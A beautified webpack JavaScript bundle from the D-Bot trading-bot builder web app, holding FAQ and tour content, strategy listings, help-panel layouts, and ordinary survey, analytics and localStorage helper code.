                        search_id: `${l}-0`
                    }, {
                        id: 2,
                        type: "Tour",
                        subtype: "BotBuilder",
                        content: (0, i.NC)("Let’s build a bot!"),
                        src: (0, a.oY)("bot-builder-tour.png"),
                        search_id: `${l}-1`
                    }],
                    d = () => [{
                        id: 1,
                        type: "DBotVideo",
                        content: (0, i.NC)("An introduction to D-Bot"),
                        url: "https://www.youtube.com/embed/lthEgaIY1uw",
                        src: (0, a.oY)("intro_to_deriv_bot.png"),
                        search_id: `${o}-0`
                    }, {
                        id: 2,
                        type: "DBotVideo",
                        content: (0, i.NC)("How to build a basic trading bot with D-Bot"),
                        url: "https://www.youtube.com/embed/mnpi2g7YakU",
                        src: (0, a.oY)("build_a_bot.png"),
                        search_id: `${o}-1`
                    }, {
                        id: 3,
                        type: "DBotVideo",
                        content: (0, i.NC)("How to use Martingale strategy on D-Bot"),
                        url: "https://www.youtube.com/embed/FSslvF7P00I",
                        src: (0, a.oY)("how_to_use_martingale.jpg"),
                        search_id: `${o}-2`
                    }, {
                        id: 4,
                        type: "DBotVideo",
                        content: (0, i.NC)("Introducing Accumulator Options on D-Bot: Available for automated trading"),
                        url: "https://www.youtube.com/embed/uMBBmdNaadU",
                        src: (0, a.oY)("introducing_accumulators_on_deriv_bot.png"),
                        search_id: `${o}-3`
                    }],
                    c = () => [{
                        title: (0, i.NC)("What is D-Bot?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("Binarytool is a web-based strategy builder for trading digital options. It’s a platform where you can build your own automated trading bot using drag-and-drop 'blocks'.")
                        }],
                        search_id: "faq-0"
                    }, {
                        title: (0, i.NC)("Where do I find the blocks I need?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("Follow these steps:")
                        }, {
                            type: "text",
                            content: (0, i.NC)("1. Go to <strong>Bot Builder</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("2. Under the <strong>Blocks menu</strong>, you'll see a list of categories. Blocks are grouped within these categories. Choose the block you want and drag them to the workspace.")
                        }, {
                            type: "image",
                            src: (0, a.oY)("blocks_menu.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)("3. You can also search for the blocks you want using the search bar above the categories.")
                        }, {
                            type: "image",
                            src: (0, a.oY)("blocks_menu_search.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)('For more info, <a href="https://deriv.com/academy/blog/posts/how-to-build-a-basic-trading-bot-with-dbot/" target="_blank">check out this blog post</a> on the basics of building a trading bot.')
                        }],
                        search_id: "faq-1"
                    }, {
                        title: (0, i.NC)("How do I remove blocks from the workspace?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("Click on the block you want to remove and press <strong>Delete</strong> on your keyboard.")
                        }],
                        search_id: "faq-2"
                    }, {
                        title: (0, i.NC)("How do I create variables?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("1. Under the <strong>Blocks</strong> menu, go to <strong>Utility > Variables</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("2. Enter a name for your variable, and hit <strong>Create</strong>. New blocks containing your new variable will appear below.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("3. Choose the block you want and drag it to the workspace.")
                        }],
                        search_id: "faq-3"
                    }, {
                        title: (0, i.NC)("Do you offer pre-built trading bots on D-Bot?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("Yes, you can get started with a pre-built bot using the <strong>Quick strategy</strong> feature. You’ll find some of the most popular trading strategies here: Martingale, D'Alembert, and Oscar's Grind. Just select the strategy, enter your trade parameters, and your bot will be created for you. You can always tweak the parameters later.")
                        }],
                        search_id: "faq-4"
                    }, {
                        title: (0, i.NC)("What is a quick strategy?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("A quick strategy is a ready-made strategy that you can use in D-Bot. There are 3 quick strategies you can choose from: Martingale, D'Alembert, and Oscar's Grind.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("<strong>Using a quick strategy</strong>")
                        }, {
                            type: "text",
                            content: (0, i.NC)("1. Go to <strong>Quick strategy</strong> and select the strategy you want.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("2. Select the asset and trade type.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("3. Set your trade parameters and hit <strong>Run</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("4. Once the blocks are loaded onto the workspace, tweak the parameters if you want, or hit <strong>Run</strong> to start trading.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("5. Hit <strong>Save</strong> to download your bot. You can choose to download your bot to your device or your Google Drive.")
                        }],
                        search_id: "faq-5"
                    }, {
                        title: (0, i.NC)("How do I save my strategy?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("In <strong>Bot Builder</strong>, hit <strong>Save</strong> on the toolbar at the top to download your bot. Give your bot a name, and choose to download your bot to your device or Google Drive. Your bot will be downloaded as an XML file.")
                        }],
                        search_id: "faq-6"
                    }, {
                        title: (0, i.NC)("How do I import my own trading bot into D-Bot?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("Just drag the XML file from your computer onto the workspace, and your bot will be loaded accordingly. Alternatively, you can hit <strong>Import</strong> in <strong>Bot Builder</strong>, and choose to import your bot from your computer or from your Google Drive.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("<strong>Import from your computer</strong>")
                        }, {
                            type: "text",
                            content: (0, i.NC)("1. After hitting <strong>Import</strong>, select <strong>Local</strong> and click <strong>Continue</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("2. Select your XML file and hit <strong>Open</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("3. Your bot will be loaded accordingly.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("<strong>Import from your Google Drive</strong>")
                        }, {
                            type: "text",
                            content: (0, i.NC)("1. After hitting <strong>Import</strong>, select <strong>Google Drive</strong> and click <strong>Continue</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("2. Select your XML file and hit <strong>Select</strong>.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("3. Your bot will be loaded accordingly.")
                        }],
                        search_id: "faq-7"
                    }, {
                        title: (0, i.NC)("How do I reset the workspace?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("In <strong>Bot Builder</strong>, hit <strong>Reset</strong> on the toolbar at the top. This will clear the workspace. Please note that any unsaved changes will be lost.")
                        }],
                        search_id: "faq-8"
                    }, {
                        title: (0, i.NC)("How do I clear my transaction log?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("1. Hit <strong>Reset</strong> at the bottom of stats panel.")
                        }, {
                            type: "image",
                            src: (0, a.oY)("reset_transaction_log.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)("2. Hit <strong>Ok</strong> to confirm.")
                        }, {
                            type: "image",
                            src: (0, a.oY)("reset_transaction_log_message.png")
                        }],
                        search_id: "faq-9"
                    }, {
                        title: (0, i.NC)("How do I control my losses with D-Bot?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("There are several ways to control your losses with D-Bot. Here’s a simple example of how you can implement loss control in your strategy:")
                        }, {
                            type: "image",
                            src: (0, a.oY)("loss_control_all_block.png"),
                            imageclass: "loss-control"
                        }, {
                            type: "text",
                            content: (0, i.NC)("<strong>1.</strong> Create the following variables and place them under <strong>Run once at start</strong>:")
                        }, {
                            type: "text",
                            content: (0, i.NC)("• <strong>Stop loss threshold</strong>: Use this variable to store your loss limit. You can assign any amount you want. Your bot will stop when your losses hits or exceeds this amount.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("Example:")
                        }, {
                            type: "image",
                            src: (0, a.oY)("loss_control_set_stop_loss.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)("• <strong>Current stake</strong>: Use this variable to store the stake amount. You can assign any amount you want, but it must be a positive number.")
                        }, {
                            type: "text",
                            content: (0, i.NC)("Example:")
                        }, {
                            type: "image",
                            src: (0, a.oY)("loss_control_set_current_stake.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)("This is how your trade parameters, variables, and trade options should look like:")
                        }, {
                            type: "image",
                            src: (0, a.oY)("loss_control_trade_parameters.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)("<strong>2.</strong> Set the <strong>Purchase conditions</strong>. In this example, your bot will purchase a <strong>Rise</strong> contract when it starts and after a contract closes.")
                        }, {
                            type: "image",
                            src: (0, a.oY)("loss_control_purchase_conditions.png")
                        }, {
                            type: "text",
                            content: (0, i.NC)("<strong>3.</strong> Use a logic block to check if <strong>Total profit/loss</strong> is more than the <strong>Stop loss threshold</strong> amount. You can find the <strong>Total profit/loss</strong> variable under <strong>Analysis > Stats</strong> on the <strong>Blocks menu</strong> on the left. Your bot will continue to purchase new contracts until the <strong>Total profit/loss</strong> amount exceeds the <strong>Stop loss threshold</strong> amount.")
                        }, {
                            type: "image",
                            src: (0, a.oY)("loss_control_restart_trade_conditions.png")
                        }],
                        search_id: "faq-10"
                    }, {
                        title: (0, i.NC)("Can I run D-Bot on multiple tabs in my web browser?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)('Yes, you can. However, there are limits on your account, such as maximum number of open positions and maximum aggregate payouts on open positions. So, just keep these limits in mind when opening multiple positions. You can find more info about these limits at <a href="https://app.deriv.com/account/account-limits" target="_blank">Settings > Account limits</a>.')
                        }],
                        search_id: "faq-11"
                    }, {
                        title: (0, i.NC)("Can I trade cryptocurrencies on D-Bot?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("No, we don't offer cryptocurrencies on D-Bot.")
                        }],
                        search_id: "faq-12"
                    }, {
                        title: (0, i.NC)("Do you sell trading bots?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("No, we don't. However, you'll find quick strategies on D-Bot that'll help you build your own trading bot for free.")
                        }],
                        search_id: "faq-13"
                    }, {
                        title: (0, i.NC)("In which countries is D-Bot available?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)('We offer our services in all countries, except for the ones <a href="https://deriv.com/tnc/general-terms.pdf" target="_blank">mentioned in our terms and conditions.</a>')
                        }],
                        search_id: "faq-14"
                    }, {
                        title: (0, i.NC)("If I close my web browser, will D-Bot continue to run?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("No, D-Bot will stop running when your web browser is closed.")
                        }],
                        search_id: "faq-15"
                    }, {
                        title: (0, i.NC)("What are the most popular strategies for automated trading?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)("Three of the most commonly used strategies in automated trading are Martingale, D'Alembert, and Oscar's Grind — you can find them all ready-made and waiting for you in D-Bot.")
                        }],
                        search_id: "faq-16"
                    }, {
                        title: (0, i.NC)("How do I build a trading bot?"),
                        description: [{
                            type: "text",
                            content: (0, i.NC)('<a href="https://www.youtube.com/watch?v=QdI5zCkO4Gk&t=203s" target="_blank">Watch this video</a> to learn how to build a trading bot on D-Bot. Also, <a href="https://deriv.com/academy/blog/posts/how-to-build-a-basic-trading-bot-with-dbot/" target="_blank">check out this blog post</a> on building a trading bot.')
                        }],
                        search_id: "faq-17"
                    }],
                    u = () => [{
                        qs_name: "MARTINGALE",
                        type: (0, i.NC)("About Martingale"),
                        content: [(0, i.NC)("Exploring the Martingale strategy in D-Bot"), (0, i.NC)("An example of Martingale strategy")],
                        search_id: `${s}-0`
                    }, {
                        qs_name: "D_ALEMBERT",
                        type: (0, i.NC)("About D'Alembert"),
                        content: [(0, i.NC)("Exploring the D’Alembert strategy in D-Bot"), (0, i.NC)("An example of D’Alembert strategy")],
                        search_id: `${s}-1`
                    }, {
                        qs_name: "OSCARS_GRIND",
                        type: (0, i.NC)("About Oscar's Grind"),
                        content: [(0, i.NC)("Exploring the Oscar’s Grind strategy in D-Bot"), (0, i.NC)("An example of Oscar’s Grind strategy")],
                        search_id: `${s}-2`
                    }, {
                        qs_name: "REVERSE_MARTINGALE",
                        type: (0, i.NC)("About Reverse Martingale"),
                        content: [(0, i.NC)("Exploring the Reverse Martingale strategy in D-Bot"), (0, i.NC)("An example of Reverse Martingale strategy")],
                        search_id: `${s}-3`
                    }, {
                        qs_name: "REVERSE_D_ALEMBERT",
                        type: (0, i.NC)("About Reverse D’Alembert"),
                        content: [(0, i.NC)("Exploring the Reverse D’Alembert strategy in D-Bot"), (0, i.NC)("An example of Reverse D’Alembert strategy")],
                        search_id: `${s}-4`
                    }, {
                        qs_name: "STRATEGY_1_3_2_6",
                        type: (0, i.NC)("About 1-3-2-6"),
                        content: [(0, i.NC)("Exploring the 1-3-2-6 strategy in D-Bot"), (0, i.NC)("An example of 1-3-2-6 strategy")],
                        search_id: `${s}-5`
                    }]
            },
            84006: function(e, t, n) {
                "use strict";
                n.d(t, {
                    TJ: function() {
                        return s
                    },
                    X7: function() {
                        return o
                    },
                    _y: function() {
                        return l
                    },
                    pw: function() {
                        return i
                    }
                });
                var a = n(58902);
                let i = {
                    key: "onboard_tour"
                };
                i.key;
                let l = (e, t) => {
                        let n = document.querySelector("#db-toolbar__import-button");
                        e && 1 === t ? null == n || n.classList.add("dbot-tour-blink") : null == n || n.classList.remove("dbot-tour-blink")
                    },
                    o = (e, t) => (0, a.Jp)(t, e),
                    s = Object.freeze({
                        0: "onboarding",
                        1: "bot_builder"
                    })
            },
            21995: function(e, t, n) {
                "use strict";
                var a;
                n.d(t, {
                    UR: function() {
                        return d
                    },
                    oY: function() {
                        return i
                    }
                });
                let i = e => `assets/images/${e}`,
                    l = (e, t, n) => {
                        window.Survicate && (e && window.Survicate.track("userCountry", e), t && window.Survicate.track("accountType", t), n && window.Survicate.track("accountCreationDate", n))
                    },
                    o = !1,
                    s = e => {
                        o = e
                    },
                    r = e => {
                        let t = document.createElement("script");
                        t.id = "dbot-survicate", t.async = !0, t.src = "https://survey.survicate.com/workspaces/83b651f6b3eca1ab4551d95760fe5deb/web_surveys.js", t.onload = e;
                        let n = document.getElementsByTagName("script")[0];
                        (null == n ? void 0 : n.parentNode) ? n.parentNode.insertBefore(t, n): document.body.appendChild(t)
                    },
                    d = () => {
                        if (o) return;
                        s(!0);
                        let e = localStorage.getItem("active_loginid"),
                            t = JSON.parse(localStorage.getItem("accountsList")) || void 0,
                            n = () => {
                                if (e && t) {
                                    let {
                                        residence: n,
                                        account_type: a,
                                        created_at: i
                                    } = t[e] || {};
                                    l(n, a, i)
                                }
                            };
                        if (document.getElementById("dbot-survicate")) {
                            let e = document.getElementById("survicate-box");
                            e && (e.style.display = "block"), n()
                        } else r(n)
                    };
                a = function() {
                    let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
                        t = window.location;
                    if (!/^\/(br_)/.test(t.pathname)) return e;
                    let n = e.startsWith("/") ? e : `/${e}`;
                    return `/${t.pathname.split("/")[1]}${n}`
                }("/"), window.__webpack_public_path__ = "", window.__webpack_public_path__ = a
            },
            42457: function(e, t, n) {
                "use strict";
                n.d(t, {
                    _: function() {
                        return a
                    }
                });
                let a = (e, t) => new Promise(n => {
                    if (document.querySelector(e)) {
                        n(document.querySelector(e));
                        return
                    }
                    let a = new MutationObserver(() => {
                        document.querySelector(e) && (n(document.querySelector(e)), a.disconnect())
                    });
                    a.observe(t ? ? document.body, {
                        childList: !0,
                        subtree: !0
                    })
                })
            },
            18908: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return i
                    }
                });
                var a = n(68949);
                let i = (() => {
                    let e;
                    let t = !1,
                        n = e => {
                            var t;
                            null === (t = window.dataLayer) || void 0 === t || t.push(e)
                        },
                        i = (e, t, a) => {
                            try {
                                let i = `${e}-${t}`,
                                    l = {
                                        counters: `tr:${a.number_of_runs},\
                ts:${a.total_stake},\
                py:${a.total_payout},\
                lc:${a.lost_contracts},\
                wc:${a.won_contracts},\
                pr:${a.total_profit}`.replace(/\s/g, ""),
                                        event: "dbot_run",
                                        run_id: i
                                    };
                                n(l)
                            } catch (e) {
                                console.warn("Error pushing run data to datalayer ", e)
                            }
                        };
                    return {
                        init: n => {
                            if (!t) {
                                t = !0, setTimeout(() => {
                                    (function() {
                                        ! function(e, t, n, a, i) {
                                            e[a] = e[a] || [], e[a].push({
                                                "gtm.start": new Date().getTime(),
                                                event: "gtm.js"
                                            });
                                            let l = t.getElementsByTagName(n)[0],
                                                o = t.createElement(n);
                                            o.defer = !0, o.src = "https://www.googletagmanager.com/gtm.js?id=" + i + ("dataLayer" != a ? "&l=" + a : ""), l.parentNode.insertBefore(o, l)
                                        }(window, document, "script", "dataLayer", "GTM-NF7884S")
                                    })()
                                }, 3e3);
                                try {
                                    let {
                                        run_panel: t,
                                        transactions: l,
                                        client: o,
                                        common: s
                                    } = n;
                                    (0, a.U5)(() => t.is_running, () => {
                                        t.is_running && (clearTimeout(e), e = setTimeout(() => {
                                            var e;
                                            i(null == o ? void 0 : o.loginid, null == s ? void 0 : null === (e = s.server_time) || void 0 === e ? void 0 : e.unix(), null == l ? void 0 : l.statistics)
                                        }, 500))
                                    })
                                } catch (e) {
                                    console.warn("Error initializing GTM reactions ", e)
                                }
                            }
                        },
                        pushDataLayer: n,
                        onTransactionClosed: e => {
                            n({
                                event: "dbot_run_transaction",
                                reference_id: (null == e ? void 0 : e.contract_id) ? ? ""
                            })
                        },
                        onRunBot: i
                    }
                })()
            },
            69103: function(e, t, n) {
                "use strict";
                n.d(t, {
                    I: function() {
                        return a
                    },
                    S: function() {
                        return r
                    }
                });
                let a = {
                        TEXT: "text",
                        VIDEO: "video",
                        IMAGE: "image",
                        BLOCK: "block",
                        EXAMPLE: "example"
                    },
                    {
                        TEXT: i,
                        IMAGE: l,
                        BLOCK: o,
                        EXAMPLE: s
                    } = a,
                    r = e => (window.__webpack_public_path__ = e, {
                        procedures_ifreturn: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "if-return"
                        }],
                        math_arithmetic: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        math_single: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        math_constrain: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "constrain"
                        }],
                        text_print: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }],
                        text_prompt_ext: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }],
                        tick_analysis: [{
                            type: i
                        }, {
                            type: o
                        }],
                        read_details: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        last_digit: [{
                            type: i
                        }, {
                            type: o
                        }],
                        read_ohlc: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "in_candle_list_read"
                        }],
                        read_ohlc_obj: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "read_candle_value"
                        }],
                        check_direction: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        get_ohlc: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "get_candle"
                        }, {
                            type: i
                        }],
                        ohlc: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "candle_list_1"
                        }],
                        ohlc_values: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "candle_list"
                        }],
                        is_candle_black: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/is_candle_black.jpeg`
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/is_candle_black_1.jpeg`
                        }, {
                            type: i
                        }],
                        ohlc_values_in_list: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "candle_list_1"
                        }],
                        variables_gets: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        variables_set: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/create_variable.jpg`
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/set_variable.png`
                        }],
                        epoch: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "epoch"
                        }],
                        todatetime: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "todatetime"
                        }, {
                            type: i
                        }],
                        totimestamp: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "totimestamp"
                        }, {
                            type: i
                        }],
                        notify_telegram: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "notify_telegram"
                        }],
                        console: [{
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        balance: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        sma_statement: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "60%",
                            url: `${window.__webpack_public_path__}assets/media/sma_formula.png`
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/sma_chart_1.png`
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/sma_chart_2.png`
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "sma_block_example"
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "sma_block_example_1"
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "sma_array"
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "100%",
                            url: `${window.__webpack_public_path__}assets/media/sma_array_explanation.jpeg`
                        }],
                        trade_definition: [{
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: o
                        }],
                        trade_definition_tradeoptions: [{
                            type: i
                        }, {
                            type: o
                        }],
                        trade_definition_multiplier: [{
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        before_purchase: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }],
                        during_purchase: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "sell_available"
                        }],
                        sell_at_market: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "sell_available"
                        }],
                        after_purchase: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }],
                        trade_again: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "trade_again"
                        }],
                        contract_check_result: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "check_result"
                        }],
                        sell_price: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "sell_pl"
                        }],
                        controls_if: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "controls_if"
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "compare_logic"
                        }, {
                            type: s,
                            example_id: "compare_logic_1"
                        }],
                        logic_operation: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: l,
                            width: "40%",
                            url: `${window.__webpack_public_path__}assets/media/logic.png`
                        }],
                        controls_whileUntil: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "repeat_while"
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "repeat_until"
                        }],
                        controls_for: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "controls_for"
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        controls_forEach: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "controls_forEach"
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: i
                        }],
                        controls_flow_statements: [{
                            type: i
                        }, {
                            type: o
                        }, {
                            type: i
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "break_out"
                        }, {
                            type: i
                        }, {
                            type: s,
                            example_id: "continue"
                        }]
                    })
            },
            58902: function(e, t, n) {
                "use strict";
                n.d(t, {
                    $8: function() {
                        return i
                    },
                    Jp: function() {
                        return l
                    },
                    ev: function() {
                        return o
                    }
                });
                let a = () => JSON.parse(localStorage.getItem("dbot_settings")),
                    i = e => {
                        let t = a();
                        return t ? t[e] : null
                    },
                    l = (e, t) => {
                        let n = a() || {};
                        n[e] = t, localStorage.setItem("dbot_settings", JSON.stringify(n))
                    },
                    o = e => {
                        let t = a() || {};
                        delete t[e], localStorage.setItem("dbot_settings", JSON.stringify(t))
                    }
            },
            33304: function(e, t, n) {
                "use strict";
                n.d(t, {
                    F0: function() {
                        return a
                    }
                });
                let a = "Deriv"
            },
            27179: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Yp: function() {
                        return s
                    },
                    gb: function() {
                        return o
                    },
                    kT: function() {
                        return r
                    }
                });
                var a = n(30381),
                    i = n.n(a);
                let l = e => i().unix(e).utc(),
                    o = e => e && i()(e).isValid() ? i().isMoment(e) && e.isValid() && e.isUTC() ? e : "number" == typeof e ? l(e) : i().utc(e) : i()().utc(),
                    s = "YYYY-MM-DD HH:mm:ss [GMT]",
                    r = "YYYY-MM-DD HH:mm:ss Z"
            },
            89606: function(e, t, n) {
                "use strict";
                n.d(t, {
                    J: function() {
                        return l
                    }
                });
                var a = n(85893),
                    i = n(67294);
                let l = (0, i.memo)(e => {
                    let {
                        icon: t,
                        ...n
                    } = e;
                    return (0, a.jsx)("div", {
                        className: "dummy-icon",
                        ...n,
                        children: (0, a.jsx)("img", {
                            src: `assets/icons/${t}.svg`,
                            alt: t,
                            onError: e => {
                                e.target.src = "assets/icons/IcDashboard.svg"
                            }
                        })
                    })
                })
            },
            18925: function() {}
        },
        t = {};

    function n(a) {
        var i = t[a];
        if (void 0 !== i) return i.exports;
        var l = t[a] = {
            id: a,
            loaded: !1,
            exports: {}
        };
        return e[a].call(l.exports, l, l.exports, n), l.loaded = !0, l.exports
    }
    n.m = e, n.n = function(e) {
        var t = e && e.__esModule ? function() {
            return e.default
        } : function() {
            return e
        };
        return n.d(t, {
            a: t
        }), t
    }, (() => {
        var e, t = Object.getPrototypeOf ? function(e) {
            return Object.getPrototypeOf(e)
        } : function(e) {
            return e.__proto__
        };
        n.t = function(a, i) {
            if (1 & i && (a = this(a)), 8 & i || "object" == typeof a && a && (4 & i && a.__esModule || 16 & i && "function" == typeof a.then)) return a;
            var l = Object.create(null);
            n.r(l);
            var o = {};
            e = e || [null, t({}), t([]), t(t)];
            for (var s = 2 & i && a;
                "object" == typeof s && !~e.indexOf(s); s = t(s)) Object.getOwnPropertyNames(s).forEach(function(e) {
                o[e] = function() {
                    return a[e]
                }
            });
            return o.default = function() {
                return a
            }, n.d(l, o), l
        }
    })(), n.d = function(e, t) {
        for (var a in t) n.o(t, a) && !n.o(e, a) && Object.defineProperty(e, a, {
            enumerable: !0,
            get: t[a]
        })
    }, n.f = {}, n.e = function(e) {
        return Promise.all(Object.keys(n.f).reduce(function(t, a) {
            return n.f[a](e, t), t
        }, []))
